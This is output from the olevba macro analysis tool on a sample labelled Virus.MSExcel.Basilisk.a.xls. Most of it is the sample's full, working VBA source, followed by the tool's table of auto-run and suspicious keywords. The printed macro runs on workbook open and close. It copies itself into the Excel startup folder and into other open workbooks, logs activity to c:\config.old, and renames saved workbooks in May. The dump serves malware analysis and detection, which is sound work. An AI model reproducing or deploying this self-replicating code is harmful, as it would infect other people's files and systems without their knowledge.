olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Basilisk.a.xls
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSExcel.Basilisk.a.xls 
in file: Virus.MSExcel.Basilisk.a.xls - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Dim Quaffle As Boolean
Private Sub Workbook_BeforeClose(Cancel As Boolean)
Quaffle = True
Workbook_Open
Call CedricDiggory("ferm� ")
Call Frimer(ActiveWorkbook)
End Sub
Private Sub Workbook_Open()
On Error Resume Next
Application.EnableCancelKey = 0
Application.ScreenUpdating = False
Dim Basilisk As String, beak, Salmon As Integer
Const antinople = "c:\program files\microsoft office\office\xlstart\book1.xls"
For Salmon = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents.Item(Salmon).Name = "ThisWorkbook" Then
Basilisk = ActiveWorkbook.VBProject.VBComponents.Item(Salmon).CodeModule.Lines(1, ActiveWorkbook.VBProject.VBComponents.Item(Salmon).CodeModule.CountOfLines)
End If: Next Salmon
If Dir(antinople) = "" Then
Workbooks.Add
For Salmon = 1 To ActiveWorkbook.VBProject.VBComponents.Count
If ActiveWorkbook.VBProject.VBComponents.Item(Salmon).Name = "ThisWorkbook" Then
ActiveWorkbook.VBProject.VBComponents.Item(Salmon).CodeModule.AddFromString Basilisk
ActiveWorkbook.SaveAs antinople
ActiveWorkbook.Close
End If: Next Salmon: End If
For beak = 1 To Excel.Windows.Count
For Salmon = 1 To Application.Workbooks.Item(beak).VBProject.VBComponents.Count
If Application.Workbooks.Item(beak).VBProject.VBComponents.Item(Salmon).Name = "ThisWorkbook" Then
If Application.Workbooks.Item(beak).VBProject.VBComponents.Item(Salmon).CodeModule.CountOfLines < 1 Then
Application.Workbooks.Item(beak).VBProject.VBComponents.Item(Salmon).CodeModule.AddFromString Basilisk
End If: End If: Next Salmon: Next beak
If Not Quaffle Then Call CedricDiggory("Ouvert ")
Application.ScreenUpdating = True
End Sub
Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
If Left(ActiveWorkbook.Name, 4) = "book" Then
Application.Dialogs(xlDialogSaveAs).Show
'    SaveAsUI = true
End If
End Sub
Private Sub Frimer(parp As Workbook)
Dim Draco As String
Randomize
Draco = Chr$(Int((25 * Rnd) + 65)) & ActiveWorkbook.Name
If Month(Now) = 5 Then parp.SaveAs Draco
End Sub
Private Sub CedricDiggory(Cho As String)
Open "c:\config.old" For Append As #1
Print #1, Cho & Now & " " & ActiveWorkbook.Name
Close #1
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

